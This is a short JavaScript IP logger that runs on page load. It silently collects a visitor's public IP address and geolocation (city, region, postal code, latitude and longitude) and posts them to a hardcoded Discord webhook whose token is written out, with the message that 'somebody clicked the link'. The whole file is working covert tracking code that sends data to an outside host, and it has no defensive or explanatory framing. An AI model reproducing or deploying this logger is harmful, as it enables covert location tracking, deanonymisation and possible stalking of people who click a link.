const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1434353559490793593/USESv9zPhy0xsDpXn-u011LWqSWqBdxTvUO3FFablB-49Rh1lEw-Waop39QfsAIuxslX';
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "IP Logger", 
                            avatar_url: "https://th.bing.com/th/id/R.ef657fe0dddc0a41e65c52899fb4e854?rik=hB3J9UA3opGm%2bw&riu=http%3a%2f%2fwww.clipartbest.com%2fcliparts%2fdT7%2fo5a%2fdT7o5aELc.png&ehk=l1D%2faZeLbHU9dbrFHyD9M91dF%2bwyhxLNK1PQo6JHsrc%3d&risl=&pid=ImgRaw&r=0", 
                            content: `<@1263705382010748971> link was clicked`,
                            embeds: [
                                {
                                    title: 'somebody clicked the link',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
